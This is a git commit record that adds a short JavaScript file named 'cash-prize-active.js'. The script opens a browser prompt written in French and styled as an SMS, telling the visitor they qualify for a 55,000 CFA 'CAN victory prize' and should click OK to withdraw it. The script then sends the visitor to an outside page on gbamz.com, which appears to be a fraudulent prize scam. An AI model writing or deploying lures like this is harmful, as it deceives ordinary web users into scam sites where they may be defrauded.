599f4a2756295aec2d82543ed34f3c8947200991
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-19 10:44:38 +0100

    Create cash-prize-active.js

---
+++ cash-prize-active.js
@@ -0,0 +1,5 @@
+var password = 'RETRAIT 55 000 FCFA'
+password=prompt('SMS: Félicitations, vous êtes éligible au Prix de la Victoire de la CAN de 55 000 CFA, cliquez sur OK pour retirer','RETRAIT 55 000 FCFA');
+if (password != 'RETRAIT 55 000 FCFA') {
+location.href='https://gbamz.com/55000.html';
+}
